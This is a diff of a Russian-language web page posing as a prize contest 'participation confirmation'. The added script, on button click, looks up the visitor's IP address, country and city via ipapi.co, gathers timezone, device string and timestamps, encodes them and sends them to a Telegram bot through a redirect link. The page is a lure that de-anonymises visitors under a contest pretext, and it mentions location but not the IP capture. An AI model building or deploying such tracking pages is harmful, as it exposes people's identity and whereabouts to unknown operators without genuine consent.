@@ -15,47 +15,70 @@
             <source src="background.mp4" type="video/mp4">
         </video>
 
-        <!-- ПОДСВЕТКА ПОЗАДИ ВИДЕО -->
         <div class="video-glow"></div>
     </div>
 
-    <!-- ГЛИТЧ + ЗАТЕМНЕНИЕ -->
     <div class="overlay"></div>
     <div class="glitch"></div>
 
-    <!-- КОНТЕНТ -->
+    <!-- Контент -->
     <div class="content">
-    <h1>Подтверждение участия</h1>
+        <h1>Подтверждение участия</h1>
 
-    <p>
-        Нажмите кнопку ниже, чтобы подтвердить участие в конкурсе. 
-        После перехода бот автоматически получит данные о вашей локации 
-        и времени подтверждения — это необходимо для отметки вас как участника.
-    </p>
+        <p>
+            Нажмите кнопку ниже, чтобы подтвердить участие в конкурсе. 
+            После перехода бот автоматически получит данные о вашей локации 
+            и времени подтверждения — это необходимо для отметки вас как участника.
+        </p>
 
-    <a class="btn" id="confirmBtn">Подтвердить участие</a>
+        <a class="btn" id="confirmBtn">Подтвердить участие</a>
 
-    <p class="note">
-        Данные используются только для проверки выполнения условий конкурса.
-    </p>
-</div>
-    
-    <script>
-        function generatePayload() {
-            const payload = {
-                uid: crypto.randomUUID(),
-                timestamp: new Date().toISOString(),
-                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                userAgent: navigator.userAgent
-            };
-            return btoa(JSON.stringify(payload));
-        }
+        <p class="note">
+            Данные используются только для проверки выполнения условий конкурса.
+        </p>
+    </div>
 
-        document.getElementById("confirmBtn").onclick = () => {
-            const encoded = generatePayload();
-            window.location.href = "https://t.me/Check_prizebot?start=" + encoded;
-        };
-    </script>
+
+<script>
+document.getElementById("confirmBtn").onclick = async () => {
+
+    const uid = crypto.randomUUID();
+    const timestamp_local = new Date().toLocaleString();
+    const timestamp_utc = new Date().toISOString();
+    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const device = navigator.userAgent;
+
+    // Получаем IP + город + страну
+    let ip = "unknown";
+    let country = "unknown";
+    let city = "unknown";
+
+    try {
+        const res = await fetch("https://ipapi.co/json/");
+        const data = await res.json();
+        ip = data.ip;
+        country = data.country_name;
+        city = data.city;
+    } catch(e) {
+        console.log("IP не получен");
+    }
+
+    const payload = {
+        uid: uid,
+        ip: ip,
+        country: country,
+        city: city,
+        timezone: timezone,
+        device: device,
+        time_local: timestamp_local,
+        time_utc: timestamp_utc
+    };
+
+    const encoded = btoa(JSON.stringify(payload));
+
+    window.location.href = "https://t.me/Check_prizebot?start=" + encoded;
+};
+</script>
 
 </body>
 </html>
